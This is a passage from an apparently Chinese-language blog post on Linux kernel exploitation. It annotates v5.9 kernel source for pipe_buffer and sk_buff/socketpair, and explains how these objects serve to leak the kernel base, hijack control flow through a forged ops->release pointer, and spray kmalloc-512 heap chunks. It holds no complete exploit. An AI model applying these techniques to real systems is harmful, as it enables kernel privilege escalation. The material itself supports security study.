class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>其中的<code>ops</code>成员，即<code>struct pipe_buf_operations</code>结构的<code>pipe-&gt;bufs[i]-&gt;ops</code>，其中保存着全局的函数表，可通过这个来泄露内核基地址，相关结构如下所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②劫持程序流"   >
          <a href="#②劫持程序流" class="heading-link"><i class="fas fa-link"></i></a><a href="#②劫持程序流" class="headerlink" title="②劫持程序流"></a>②劫持程序流</h4>
      <p>当关闭了管道的两端时，调用到<code>free_pipe_info</code>函数，在清理<code>pipe_buffer</code>时进入如下判断：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">    pipe_buf_release(pipe, buf);</span><br></pre></td></tr></table></div></figure>

<p>当管道中存在未被读取的数据时，即我们需要调用<code>write</code>向管道的写入端写入数据</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">    buf-&gt;page = page;</span><br><span class="line">    buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">    buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后不要将数据全部读取出来，如果全部读取出来的话，那么在<code>read</code>对应的<code>pipe_read</code>函数中就会如下情况</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_read</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">        pipe_buf_release(pipe, buf);</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>从而调用<code>pipe_buf_release</code>将<code>buf-&gt;ops</code>清空。</p>
<p>🔺注：（其实这里既然调用到了<code>pipe_buf_release</code>函数，那么我们直接通过<code>read</code>将管道<code>pipe</code>中的所有数据读取出来，其实也能执行该<code>release</code>函数指针的，从而劫持程序控制流的。）</p>
<p>那么接着上述的情况，那么在关闭两端时<code>buf-&gt;ops</code>这个函数表就会存在</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png" alt="image-20220509192251738"></p>
<p>而当<code>buf-&gt;ops</code>这个函数表存在时，关闭管道符两端进入上述判断之后，就会调用到其中的<code>pipe_buf_release</code>函数，该函数会调用到这个<code>buf-&gt;ops</code>函数表结构下对应的<code>relase</code>函数指针，该指针在上述的<code>pipe_buf_operations</code>结构中有提到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png" alt="image-20220509193945468"></p>
<p>那么如果劫持了<code>buf-&gt;ops</code>这个函数表，就能控制到<code>release</code>函数指针，从而劫持控制流程。</p>
<p>不过<code>pipe</code>管道具体的保存的数据放在哪里，还是不太清楚，听<code>bsauce</code>说是在<code>struct pipe_buffer</code>结构下<code>buf</code>的<code>page</code>里面，但是没有找到，后续还需要继续看看，先mark一下。这样也可以看出来，每写入一条信息时，内核的<code>kmalloc</code>对应的堆内存基本是不发生变化的，与下面提到的<code>sk_buff</code>有点不同。</p>

        <h2 id="3-sk-buff—kmalloc-512及以上"   >
          <a href="#3-sk-buff—kmalloc-512及以上" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-sk-buff—kmalloc-512及以上" class="headerlink" title="3.sk_buff—kmalloc-512及以上"></a>3.sk_buff—kmalloc-512及以上</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40039738/article/details/81095013" >(31条消息) socketpair的用法和理解_雪过无痕_的博客-CSDN博客_socketpair</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>和该结构体相关的是一个<code>socketpair</code>系统调用这个也算是<code>socket</code>网络协议的一种，但是是在本地进程之间通信的，而非在网络之间的通信。说到底，这个其实和<code>pipe</code>非常像，也是一个进程间的通信手段。不过相关区分如下：</p>
<ul>
<li>数据传输模式<ul>
<li><code>pipe</code>：单工，发送端<code>fd[1]</code>发送数据，接收端<code>fd[0]</code>接收数据</li>
<li><code>socketpair</code>：全双工，同一时刻两端均可发送和接收数据，无论信道中的数据是否被接收完毕。</li>
</ul>
</li>
<li>模式<ul>
<li><code>pipe</code>：由<code>flag</code>来定义不同模式</li>
<li><code>socketpair</code>：默认阻塞状态</li>
</ul>
</li>
</ul>
<p>此外在《Linux系统编程手册》一书中提到，<code>pipe()</code>函数实际上被实现成了一个对<code>socketpair</code>的调用。</p>

        <h3 id="1-使用方法-2"   >
          <a href="#1-使用方法-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法-2" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建-3"   >
          <a href="#①创建-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-3" class="headerlink" title="①创建"></a>①创建</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//默认必须</span></span><br><span class="line"><span class="keyword">int</span> socket_fd[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//domain参数必须被指定为AF_UNIX,不同的</span></span><br><span class="line"><span class="keyword">int</span> sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socket_fd);</span><br><span class="line"><span class="keyword">if</span>( sockPair_return &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror( <span class="string">&quot;socketpair()&quot;</span> );</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后和<code>pipe</code>管道一样，使用<code>write/read</code>即可，不过这个的fd两端都可以写入读取，但是消息传递的时候一端写入消息，就需要从另一端才能把消息读取出来</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(socket_fd[<span class="number">0</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(socket_fd[<span class="number">1</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="②释放-3"   >
          <a href="#②释放-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-3" class="headerlink" title="②释放"></a>②释放</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(socket_fd[<span class="number">0</span>]);</span><br><span class="line">close(socket_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>可以看到和<code>pipe</code>是很相似的。</p>

        <h3 id="2-内存分配与释放-2"   >
          <a href="#2-内存分配与释放-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放-2" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      <p>在调用<code>socketpair</code>这个系统调用号时，并不会进行相关的内存分配，只有在使用<code>write</code>来写入消息，进行数据传输时才会分配。</p>

        <h4 id="①分配-1"   >
          <a href="#①分配-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①分配-1" class="headerlink" title="①分配"></a>①分配</h4>
      <p>在调用<code>write</code>进行数据写入时</p>
<p>函数链：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write -&gt; ksys_write() -&gt; vfs_write() -&gt; new_sync_write() -&gt; call_write_iter() -&gt; sock_write_iter() -&gt; sock_sendmsg() -&gt; sock_sendmsg_nosec() -&gt; unix_stream_sendmsg()-&gt;内存申请/数据复制</span><br></pre></td></tr></table></div></figure>

<p>在<code>unix_stream_sendmsg</code>开始分叉</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">other</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> err, size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> sent = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> fds_sent = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> data_len;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">	<span class="keyword">while</span> (sent &lt; len) &#123;</span><br><span class="line">		size = len - sent;</span><br><span class="line">		<span class="comment">/* Keep two messages in the pipe so it schedules better */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, (sk-&gt;sk_sndbuf &gt;&gt; <span class="number">1</span>) - <span class="number">64</span>);</span><br><span class="line">		<span class="comment">/* allow fallback to order-0 allocations */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, SKB_MAX_HEAD(<span class="number">0</span>) + UNIX_SKB_FRAGS_SZ);</span><br><span class="line">		data_len = <span class="keyword">max_t</span>(<span class="keyword">int</span>, <span class="number">0</span>, size - SKB_MAX_HEAD(<span class="number">0</span>));</span><br><span class="line">		data_len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_ALIGN(data_len));</span><br><span class="line">        <span class="comment">//------------------分叉一:内存申请部分</span></span><br><span class="line">		skb = sock_alloc_send_pskb(sk, size - data_len, data_len,</span><br><span class="line">					   msg-&gt;msg_flags &amp; MSG_DONTWAIT, &amp;err,</span><br><span class="line">					   get_order(UNIX_SKB_FRAGS_SZ));</span><br><span class="line">        <span class="comment">//相关检查部分</span></span><br><span class="line">		<span class="keyword">if</span> (!skb)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		<span class="comment">/* Only send the fds in the first buffer */</span></span><br><span class="line">		err = unix_scm_to_skb(&amp;scm, skb, !fds_sent);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//.....</span></span><br><span class="line">        <span class="comment">//----------------------分叉二:数据复制部分</span></span><br><span class="line">		skb_put(skb, size - data_len);</span><br><span class="line">		skb-&gt;data_len = data_len;</span><br><span class="line">		skb-&gt;len = size;</span><br><span class="line">        <span class="comment">//这里开始进行数据复制</span></span><br><span class="line">		err = skb_copy_datagram_from_iter(skb, <span class="number">0</span>, &amp;msg-&gt;msg_iter, size);</span><br><span class="line">		<span class="keyword">if</span> (err) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">		sent += size;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sent;</span><br><span class="line">out_err:</span><br><span class="line">	scm_destroy(&amp;scm);</span><br><span class="line">	<span class="keyword">return</span> sent ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-内存申请-1"   >
          <a href="#A-内存申请-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-内存申请-1" class="headerlink" title="A.内存申请"></a>A.内存申请</h5>
      <p>先进行相关内存申请，即<code>sock_alloc_send_pskb() -&gt; alloc_skb_with_frags() -&gt; alloc_skb() -&gt; __alloc_skb()</code></p>
<p>还是挺长的，但是最重要的还是最后的<code>__alloc_skb</code>函数，</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">			    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	u8 *data;</span><br><span class="line">	<span class="keyword">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">	cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">		? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">		gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get the HEAD */</span></span><br><span class="line">    <span class="comment">//从专门的缓存池skbuff_fclone_cache/skbuff_head_cache中申请内存</span></span><br><span class="line">    <span class="comment">//作为头部的管理结构</span></span><br><span class="line">	skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~__GFP_DMA, node);</span><br><span class="line">	<span class="keyword">if</span> (!skb)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    <span class="comment">//先对齐，这个和L1_CACHE_BYTES有关,64位系统即和64(0x40)对齐,32位类似，具体的还是查一下最好</span></span><br><span class="line">	size = SKB_DATA_ALIGN(size);</span><br><span class="line">    <span class="comment">//size += 对齐之后的0x140</span></span><br><span class="line">    <span class="comment">//那么size只可能是0x140+n*0x40,最低为0x180,属于kmalloc-512</span></span><br><span class="line">	size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(struct skb_shared_info));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//虽然是kmalloc_reserve函数，但是最终还是kmalloc形式</span></span><br><span class="line">    <span class="comment">//调用到`__kmalloc_node_track_caller`函数进行分配</span></span><br><span class="line">    <span class="comment">//这个data即为我们实际的存储数据的地方,也是从kmalloc申请出的堆块</span></span><br><span class="line">    <span class="comment">//并且是从对开的开头位置处开始存储,完成内存申请后返回unix_stream_sendmsg函数</span></span><br><span class="line">    <span class="comment">//在`skb_copy_datagram_from_iter`函数中数据会被复制</span></span><br><span class="line">	data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line">	<span class="keyword">if</span> (!data)</span><br><span class="line">		<span class="keyword">goto</span> nodata;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	size = SKB_WITH_OVERHEAD(ksize(data));</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="comment">//初始化头部的管理结构</span></span><br><span class="line">	<span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(struct sk_buff, tail));</span><br><span class="line">	<span class="comment">/* Account for allocated memory : skb + skb-&gt;head */</span></span><br><span class="line">	skb-&gt;truesize = SKB_TRUESIZE(size);</span><br><span class="line">	skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line">	refcount_set(&amp;skb-&gt;users, <span class="number">1</span>);</span><br><span class="line">	skb-&gt;head = data;</span><br><span class="line">	skb-&gt;data = data;</span><br><span class="line">	skb_reset_tail_pointer(skb);</span><br><span class="line">	skb-&gt;end = skb-&gt;tail + size;</span><br><span class="line">	skb-&gt;mac_header = (typeof(skb-&gt;mac_header))~<span class="number">0U</span>;</span><br><span class="line">	skb-&gt;transport_header = (typeof(skb-&gt;transport_header))~<span class="number">0U</span>;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> skb;</span><br><span class="line">nodata:</span><br><span class="line">	kmem_cache_free(cache, skb);</span><br><span class="line">	skb = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h6 id="内存申请总结：-1"   >
          <a href="#内存申请总结：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存申请总结：-1" class="headerlink" title="内存申请总结："></a>内存申请总结：</h6>
      <ul>
<li><code>sk_buff</code>为数据的管理结构从专门的缓存池<code>skbuff_fclone_cache/skbuff_head_cache</code>中申请内存，没办法进行控制</li>
<li><code>skb-&gt;data</code>为实际的数据结构<ul>
<li><code>size</code>：<code>0x140+n*0x40</code>(0x40的倍数补齐)。即如果传入的数据长度为0x3f，则n为1，传入数据为0x41，则n为2。</li>
<li>堆块申请：走<code>kmalloc</code>进行申请，比较常见的种类，方便堆喷。</li>
</ul>
</li>
<li>每调用<code>wirte</code>函数写入一次数据，都会走一遍流程，申请新的<code>sk_buff</code>和<code>skb-&gt;data</code>，不同消息之间相互独立。</li>
</ul>

        <h5 id="B-数据复制-1"   >
          <a href="#B-数据复制-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-数据复制-1" class="headerlink" title="B.数据复制"></a>B.数据复制</h5>
      <p>相关内存申请完成之后，回到<code>unix_stream_sendmsg</code>函数，开始进行数据复制<code>skb_copy_datagram_from_iter</code>，即上述提到的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">skb_copy_datagram_from_iter</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">                                struct iov_iter *from,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = skb_headlen(skb);			<span class="comment">// skb-&gt;len - skb-&gt;data_len;</span></span><br><span class="line">    <span class="keyword">int</span> i, copy = start - offset;			<span class="comment">// copy 是线性数据区的剩余空间大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line">    <span class="comment">//拷贝到申请的保存数据的堆块skb-&gt;data</span></span><br><span class="line">    <span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">            copy = len;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_iter(skb-&gt;data + offset, copy, from) != copy)</span><br><span class="line">            <span class="keyword">goto</span> fault;</span><br><span class="line">        <span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        offset += copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-4"   >
          <a href="#②释放-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-4" class="headerlink" title="②释放"></a>②释放</h4>
      <p>当从<code>socker</code>套接字中读取出某条信息的所有数据时，就会发生该条信息的相关内存的释放，即该条信息对应<code>sk_buff</code>和<code>skb-&gt;data</code>的释放。同样的，如果该条信息没有被读取完毕，则不会发生该信息相关内存的释放。</p>
<p>在<code>read</code>时进行的函数调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -&gt; ksys_read() -&gt; vfs_read() -&gt; new_sync_read() -&gt; call_read_iter() -&gt; sock_read_iter() -&gt; sock_recvmsg() -&gt; sock_recvmsg_nosec() -&gt; unix_stream_recvmsg() -&gt; unix_stream_read_generic()</span><br></pre></td></tr></table></div></figure>

<p>同样的在<code>unix_stream_read_generic</code>处开始分叉，也是分为两部分，下面截取重要部分</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_read_generic</span><span class="params">(struct unix_stream_read_state *state,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">bool</span> freezable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">		chunk = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, unix_skb_len(skb) - skip, size);</span><br><span class="line">		skb_get(skb);</span><br><span class="line">        <span class="comment">//------------------分叉一:数据复制</span></span><br><span class="line">        <span class="comment">//recv_actor函数指针是在unix_stream_recvmsg函数中定义的state函数表</span></span><br><span class="line">        <span class="comment">//该函数指针对应unix_stream_read_actor函数,即从这开始进行数据复制</span></span><br><span class="line">		chunk = state-&gt;recv_actor(skb, skip, chunk, state);</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span 